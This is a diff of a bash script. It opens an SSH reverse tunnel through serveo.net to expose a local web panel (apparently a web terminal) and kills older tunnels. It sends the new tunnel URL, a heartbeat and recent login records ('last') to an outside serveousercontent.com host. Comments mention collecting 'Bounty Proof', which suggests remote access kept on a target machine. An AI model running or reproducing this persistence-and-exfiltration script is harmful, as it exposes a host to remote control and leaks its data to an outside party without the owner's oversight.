@@ -1,21 +1,17 @@
 #!/bin/bash
 URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"
 
-# 1. Check if the Web Panel is already live
-if ! curl -s --unix-socket /var/run/docker.sock http://localhost/containers/web_panel/json | grep -q '"Running":true'; then
-  echo "[!] Panel Down. Restarting..." | curl -X POST -d @- "https://$URL"
-  
-  # Start the panel (assumes it was created by the previous script)
-  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/web_panel/start"
-  
-  # Restart the tunnel only if it's not already running
-  if ! pgrep -f "ssh -R 80:localhost:7681"; then
-    (ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=10 -R 80:localhost:7681 serveo.net > /tmp/web_link 2>&1) &
-  fi
-else
-  # 2. If already running, just send a 'Heartbeat' to your Mac
-  echo "--- [PULSE] System Stable | $(date) ---" | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
-fi
+# 1. Kill any hung SSH tunnels to refresh the link
+pkill -f "ssh -R 80:localhost:7681"
 
-# 3. Collect specific 'Bounty Proof' if a new user logs in
+# 2. Start the Panel and Tunnel, then GRAB the new URL
+# The '2>&1' and 'stdbuf' are key to catching the link as it generates
+(
+  ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=10 -R 80:localhost:7681 serveo.net 2>&1 | \
+  grep -m 1 "Forwarding" | \
+  curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
+) &
+
+# 3. Heartbeat (The 'last' info you're currently seeing)
+echo "--- [PULSE] System Active | $(date) ---" | curl -X POST -d @- "https://$URL"
 last | head -n 2 | curl -X POST -d @- "https://$URL"
